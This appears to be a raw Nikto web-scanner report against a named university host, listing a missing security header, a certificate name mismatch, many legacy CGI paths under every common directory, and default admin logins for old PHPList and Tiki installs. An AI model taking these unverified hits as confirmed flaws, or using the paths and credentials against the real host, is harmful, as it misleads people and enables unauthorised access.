@@ -1,0 +1,581 @@
+- Nikto v2.1.5/2.1.5
++ Target Host: oase.it.tuwien.ac.at
++ Target Port: 443
++ GET /: The anti-clickjacking X-Frame-Options header is not present.
++ GET /.0Qrdi9dV: Uncommon header 'strict-transport-security' found, with contents: max-age=31536000
++ GET //: File/dir '/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
++ GET /robots.txt: "robots.txt" contains 4 entries which should be manually viewed.
++ GET /clientaccesspolicy.xml: lines
++ GET /crossdomain.xml: /crossdomain.xml contains 0 line which should be manually viewed for improper domains or wildcards.
++ GET /: Hostname 'oase.it.tuwien.ac.at' does not match certificate's CN 'iu.zid.tuwien.ac.at'
++ GET /cgi.cgi/cart32.exe: /cgi.cgi/cart32.exe: request cart32.exe/cart32clientlist
++ GET /webcgi/cart32.exe: /webcgi/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi-914/cart32.exe: /cgi-914/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi-915/cart32.exe: /cgi-915/cart32.exe: request cart32.exe/cart32clientlist
++ GET /bin/cart32.exe: /bin/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi/cart32.exe: /cgi/cart32.exe: request cart32.exe/cart32clientlist
++ GET /mpcgi/cart32.exe: /mpcgi/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi-bin/cart32.exe: /cgi-bin/cart32.exe: request cart32.exe/cart32clientlist
++ GET /ows-bin/cart32.exe: /ows-bin/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi-sys/cart32.exe: /cgi-sys/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi-local/cart32.exe: /cgi-local/cart32.exe: request cart32.exe/cart32clientlist
++ GET /htbin/cart32.exe: /htbin/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgibin/cart32.exe: /cgibin/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgis/cart32.exe: /cgis/cart32.exe: request cart32.exe/cart32clientlist
++ GET /scripts/cart32.exe: /scripts/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi-win/cart32.exe: /cgi-win/cart32.exe: request cart32.exe/cart32clientlist
++ GET /fcgi-bin/cart32.exe: /fcgi-bin/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi-exe/cart32.exe: /cgi-exe/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi-home/cart32.exe: /cgi-home/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi-perl/cart32.exe: /cgi-perl/cart32.exe: request cart32.exe/cart32clientlist
++ GET /scgi-bin/cart32.exe: /scgi-bin/cart32.exe: request cart32.exe/cart32clientlist
++ GET /cgi.cgi/classified.cgi: /cgi.cgi/classified.cgi: Check Phrack 55 for info by RFP
++ GET /webcgi/classified.cgi: /webcgi/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi-914/classified.cgi: /cgi-914/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi-915/classified.cgi: /cgi-915/classified.cgi: Check Phrack 55 for info by RFP
++ GET /bin/classified.cgi: /bin/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi/classified.cgi: /cgi/classified.cgi: Check Phrack 55 for info by RFP
++ GET /mpcgi/classified.cgi: /mpcgi/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi-bin/classified.cgi: /cgi-bin/classified.cgi: Check Phrack 55 for info by RFP
++ GET /ows-bin/classified.cgi: /ows-bin/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi-sys/classified.cgi: /cgi-sys/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi-local/classified.cgi: /cgi-local/classified.cgi: Check Phrack 55 for info by RFP
++ GET /htbin/classified.cgi: /htbin/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgibin/classified.cgi: /cgibin/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgis/classified.cgi: /cgis/classified.cgi: Check Phrack 55 for info by RFP
++ GET /scripts/classified.cgi: /scripts/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi-win/classified.cgi: /cgi-win/classified.cgi: Check Phrack 55 for info by RFP
++ GET /fcgi-bin/classified.cgi: /fcgi-bin/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi-exe/classified.cgi: /cgi-exe/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi-home/classified.cgi: /cgi-home/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi-perl/classified.cgi: /cgi-perl/classified.cgi: Check Phrack 55 for info by RFP
++ GET /scgi-bin/classified.cgi: /scgi-bin/classified.cgi: Check Phrack 55 for info by RFP
++ GET /cgi.cgi/download.cgi: /cgi.cgi/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /webcgi/download.cgi: /webcgi/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi-914/download.cgi: /cgi-914/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi-915/download.cgi: /cgi-915/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /bin/download.cgi: /bin/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi/download.cgi: /cgi/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /mpcgi/download.cgi: /mpcgi/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi-bin/download.cgi: /cgi-bin/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /ows-bin/download.cgi: /ows-bin/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi-sys/download.cgi: /cgi-sys/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi-local/download.cgi: /cgi-local/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /htbin/download.cgi: /htbin/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgibin/download.cgi: /cgibin/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgis/download.cgi: /cgis/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /scripts/download.cgi: /scripts/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi-win/download.cgi: /cgi-win/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /fcgi-bin/download.cgi: /fcgi-bin/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi-exe/download.cgi: /cgi-exe/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi-home/download.cgi: /cgi-home/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi-perl/download.cgi: /cgi-perl/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /scgi-bin/download.cgi: /scgi-bin/download.cgi: v1 by Matt Wright; check info in Phrack 55 by RFP
++ GET /cgi.cgi/flexform.cgi: /cgi.cgi/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /webcgi/flexform.cgi: /webcgi/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-914/flexform.cgi: /cgi-914/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-915/flexform.cgi: /cgi-915/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /bin/flexform.cgi: /bin/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi/flexform.cgi: /cgi/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /mpcgi/flexform.cgi: /mpcgi/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-bin/flexform.cgi: /cgi-bin/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /ows-bin/flexform.cgi: /ows-bin/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-sys/flexform.cgi: /cgi-sys/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-local/flexform.cgi: /cgi-local/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /htbin/flexform.cgi: /htbin/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgibin/flexform.cgi: /cgibin/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgis/flexform.cgi: /cgis/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /scripts/flexform.cgi: /scripts/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-win/flexform.cgi: /cgi-win/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /fcgi-bin/flexform.cgi: /fcgi-bin/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-exe/flexform.cgi: /cgi-exe/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-home/flexform.cgi: /cgi-home/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-perl/flexform.cgi: /cgi-perl/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /scgi-bin/flexform.cgi: /scgi-bin/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi.cgi/flexform: /cgi.cgi/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /webcgi/flexform: /webcgi/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-914/flexform: /cgi-914/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-915/flexform: /cgi-915/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /bin/flexform: /bin/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi/flexform: /cgi/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /mpcgi/flexform: /mpcgi/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-bin/flexform: /cgi-bin/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /ows-bin/flexform: /ows-bin/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-sys/flexform: /cgi-sys/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-local/flexform: /cgi-local/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /htbin/flexform: /htbin/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgibin/flexform: /cgibin/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgis/flexform: /cgis/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /scripts/flexform: /scripts/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-win/flexform: /cgi-win/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /fcgi-bin/flexform: /fcgi-bin/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-exe/flexform: /cgi-exe/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-home/flexform: /cgi-home/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi-perl/flexform: /cgi-perl/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /scgi-bin/flexform: /scgi-bin/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ GET /cgi.cgi/lwgate.cgi: /cgi.cgi/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /webcgi/lwgate.cgi: /webcgi/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-914/lwgate.cgi: /cgi-914/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-915/lwgate.cgi: /cgi-915/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /bin/lwgate.cgi: /bin/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi/lwgate.cgi: /cgi/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /mpcgi/lwgate.cgi: /mpcgi/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-bin/lwgate.cgi: /cgi-bin/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /ows-bin/lwgate.cgi: /ows-bin/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-sys/lwgate.cgi: /cgi-sys/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-local/lwgate.cgi: /cgi-local/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /htbin/lwgate.cgi: /htbin/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgibin/lwgate.cgi: /cgibin/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgis/lwgate.cgi: /cgis/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /scripts/lwgate.cgi: /scripts/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-win/lwgate.cgi: /cgi-win/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /fcgi-bin/lwgate.cgi: /fcgi-bin/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-exe/lwgate.cgi: /cgi-exe/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-home/lwgate.cgi: /cgi-home/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-perl/lwgate.cgi: /cgi-perl/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /scgi-bin/lwgate.cgi: /scgi-bin/lwgate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi.cgi/LWGate.cgi: /cgi.cgi/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /webcgi/LWGate.cgi: /webcgi/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-914/LWGate.cgi: /cgi-914/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-915/LWGate.cgi: /cgi-915/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /bin/LWGate.cgi: /bin/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi/LWGate.cgi: /cgi/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /mpcgi/LWGate.cgi: /mpcgi/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-bin/LWGate.cgi: /cgi-bin/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /ows-bin/LWGate.cgi: /ows-bin/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-sys/LWGate.cgi: /cgi-sys/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-local/LWGate.cgi: /cgi-local/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /htbin/LWGate.cgi: /htbin/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgibin/LWGate.cgi: /cgibin/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgis/LWGate.cgi: /cgis/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /scripts/LWGate.cgi: /scripts/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-win/LWGate.cgi: /cgi-win/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /fcgi-bin/LWGate.cgi: /fcgi-bin/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-exe/LWGate.cgi: /cgi-exe/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-home/LWGate.cgi: /cgi-home/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi-perl/LWGate.cgi: /cgi-perl/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /scgi-bin/LWGate.cgi: /scgi-bin/LWGate.cgi: Check Phrack 55 for info by RFP, http://www.phrack.com/show.php?p=55&a=7
++ GET /cgi.cgi/lwgate: /cgi.cgi/lwgate: Check Phrack 55 for info by RFP
++ GET /webcgi/lwgate: /webcgi/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi-914/lwgate: /cgi-914/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi-915/lwgate: /cgi-915/lwgate: Check Phrack 55 for info by RFP
++ GET /bin/lwgate: /bin/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi/lwgate: /cgi/lwgate: Check Phrack 55 for info by RFP
++ GET /mpcgi/lwgate: /mpcgi/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi-bin/lwgate: /cgi-bin/lwgate: Check Phrack 55 for info by RFP
++ GET /ows-bin/lwgate: /ows-bin/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi-sys/lwgate: /cgi-sys/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi-local/lwgate: /cgi-local/lwgate: Check Phrack 55 for info by RFP
++ GET /htbin/lwgate: /htbin/lwgate: Check Phrack 55 for info by RFP
++ GET /cgibin/lwgate: /cgibin/lwgate: Check Phrack 55 for info by RFP
++ GET /cgis/lwgate: /cgis/lwgate: Check Phrack 55 for info by RFP
++ GET /scripts/lwgate: /scripts/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi-win/lwgate: /cgi-win/lwgate: Check Phrack 55 for info by RFP
++ GET /fcgi-bin/lwgate: /fcgi-bin/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi-exe/lwgate: /cgi-exe/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi-home/lwgate: /cgi-home/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi-perl/lwgate: /cgi-perl/lwgate: Check Phrack 55 for info by RFP
++ GET /scgi-bin/lwgate: /scgi-bin/lwgate: Check Phrack 55 for info by RFP
++ GET /cgi.cgi/LWGate: /cgi.cgi/LWGate: Check Phrack 55 for info by RFP
++ GET /webcgi/LWGate: /webcgi/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi-914/LWGate: /cgi-914/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi-915/LWGate: /cgi-915/LWGate: Check Phrack 55 for info by RFP
++ GET /bin/LWGate: /bin/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi/LWGate: /cgi/LWGate: Check Phrack 55 for info by RFP
++ GET /mpcgi/LWGate: /mpcgi/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi-bin/LWGate: /cgi-bin/LWGate: Check Phrack 55 for info by RFP
++ GET /ows-bin/LWGate: /ows-bin/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi-sys/LWGate: /cgi-sys/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi-local/LWGate: /cgi-local/LWGate: Check Phrack 55 for info by RFP
++ GET /htbin/LWGate: /htbin/LWGate: Check Phrack 55 for info by RFP
++ GET /cgibin/LWGate: /cgibin/LWGate: Check Phrack 55 for info by RFP
++ GET /cgis/LWGate: /cgis/LWGate: Check Phrack 55 for info by RFP
++ GET /scripts/LWGate: /scripts/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi-win/LWGate: /cgi-win/LWGate: Check Phrack 55 for info by RFP
++ GET /fcgi-bin/LWGate: /fcgi-bin/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi-exe/LWGate: /cgi-exe/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi-home/LWGate: /cgi-home/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi-perl/LWGate: /cgi-perl/LWGate: Check Phrack 55 for info by RFP
++ GET /scgi-bin/LWGate: /scgi-bin/LWGate: Check Phrack 55 for info by RFP
++ GET /cgi.cgi/perlshop.cgi: /cgi.cgi/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /webcgi/perlshop.cgi: /webcgi/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi-914/perlshop.cgi: /cgi-914/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi-915/perlshop.cgi: /cgi-915/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /bin/perlshop.cgi: /bin/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi/perlshop.cgi: /cgi/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /mpcgi/perlshop.cgi: /mpcgi/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi-bin/perlshop.cgi: /cgi-bin/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /ows-bin/perlshop.cgi: /ows-bin/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi-sys/perlshop.cgi: /cgi-sys/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi-local/perlshop.cgi: /cgi-local/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /htbin/perlshop.cgi: /htbin/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgibin/perlshop.cgi: /cgibin/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgis/perlshop.cgi: /cgis/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /scripts/perlshop.cgi: /scripts/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi-win/perlshop.cgi: /cgi-win/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /fcgi-bin/perlshop.cgi: /fcgi-bin/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi-exe/perlshop.cgi: /cgi-exe/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi-home/perlshop.cgi: /cgi-home/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /cgi-perl/perlshop.cgi: /cgi-perl/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /scgi-bin/perlshop.cgi: /scgi-bin/perlshop.cgi: v3.1 by ARPAnet.com; check info in Phrack 55 by RFP
++ GET /kboard/: /kboard/: KBoard Forum 0.3.0 and prior have a security problem in forum_edit_post.php, forum_post.php and forum_reply.php
++ GET /lists/admin/: /lists/admin/: PHPList pre 2.6.4 contains a number of vulnerabilities including remote administrative access, harvesting user info and more. Default login to admin interface is admin/phplist
++ GET /splashAdmin.php: /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
++ GET /ssdefs/: /ssdefs/: Siteseed pre 1.4.2 has 'major' security problems.
++ GET /sshome/: /sshome/: Siteseed pre 1.4.2 has 'major' security problems.
++ GET /tiki/: /tiki/: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin
++ GET /tiki/tiki-install.php: /tiki/tiki-install.php: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin
++ GET /scripts/samples/details.idc: /scripts/samples/details.idc: See RFP 9901; www.wiretrip.net
++ -396: GET /_vti_bin/shtml.exe: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
++ GET /cgi.cgi/handler.cgi: /cgi.cgi/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /webcgi/handler.cgi: /webcgi/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi-914/handler.cgi: /cgi-914/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi-915/handler.cgi: /cgi-915/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /bin/handler.cgi: /bin/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi/handler.cgi: /cgi/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /mpcgi/handler.cgi: /mpcgi/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi-bin/handler.cgi: /cgi-bin/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /ows-bin/handler.cgi: /ows-bin/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi-sys/handler.cgi: /cgi-sys/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi-local/handler.cgi: /cgi-local/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /htbin/handler.cgi: /htbin/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgibin/handler.cgi: /cgibin/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgis/handler.cgi: /cgis/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /scripts/handler.cgi: /scripts/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi-win/handler.cgi: /cgi-win/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /fcgi-bin/handler.cgi: /fcgi-bin/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi-exe/handler.cgi: /cgi-exe/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi-home/handler.cgi: /cgi-home/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi-perl/handler.cgi: /cgi-perl/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /scgi-bin/handler.cgi: /scgi-bin/handler.cgi: Variation of Irix Handler? Has been seen from other CGI scanners.
++ GET /cgi.cgi/finger: /cgi.cgi/finger: finger other users, may be other commands?
++ GET /webcgi/finger: /webcgi/finger: finger other users, may be other commands?
++ GET /cgi-914/finger: /cgi-914/finger: finger other users, may be other commands?
++ GET /cgi-915/finger: /cgi-915/finger: finger other users, may be other commands?
++ GET /bin/finger: /bin/finger: finger other users, may be other commands?
++ GET /cgi/finger: /cgi/finger: finger other users, may be other commands?
++ GET /mpcgi/finger: /mpcgi/finger: finger other users, may be other commands?
++ GET /cgi-bin/finger: /cgi-bin/finger: finger other users, may be other commands?
++ GET /ows-bin/finger: /ows-bin/finger: finger other users, may be other commands?
++ GET /cgi-sys/finger: /cgi-sys/finger: finger other users, may be other commands?
++ GET /cgi-local/finger: /cgi-local/finger: finger other users, may be other commands?
++ GET /htbin/finger: /htbin/finger: finger other users, may be other commands?
++ GET /cgibin/finger: /cgibin/finger: finger other users, may be other commands?
++ GET /cgis/finger: /cgis/finger: finger other users, may be other commands?
++ GET /scripts/finger: /scripts/finger: finger other users, may be other commands?
++ GET /cgi-win/finger: /cgi-win/finger: finger other users, may be other commands?
++ GET /fcgi-bin/finger: /fcgi-bin/finger: finger other users, may be other commands?
++ GET /cgi-exe/finger: /cgi-exe/finger: finger other users, may be other commands?
++ GET /cgi-home/finger: /cgi-home/finger: finger other users, may be other commands?
++ GET /cgi-perl/finger: /cgi-perl/finger: finger other users, may be other commands?
++ GET /scgi-bin/finger: /scgi-bin/finger: finger other users, may be other commands?
++ GET /cgi.cgi/finger.pl: /cgi.cgi/finger.pl: finger other users, may be other commands?
++ GET /webcgi/finger.pl: /webcgi/finger.pl: finger other users, may be other commands?
++ GET /cgi-914/finger.pl: /cgi-914/finger.pl: finger other users, may be other commands?
++ GET /cgi-915/finger.pl: /cgi-915/finger.pl: finger other users, may be other commands?
++ GET /bin/finger.pl: /bin/finger.pl: finger other users, may be other commands?
++ GET /cgi/finger.pl: /cgi/finger.pl: finger other users, may be other commands?
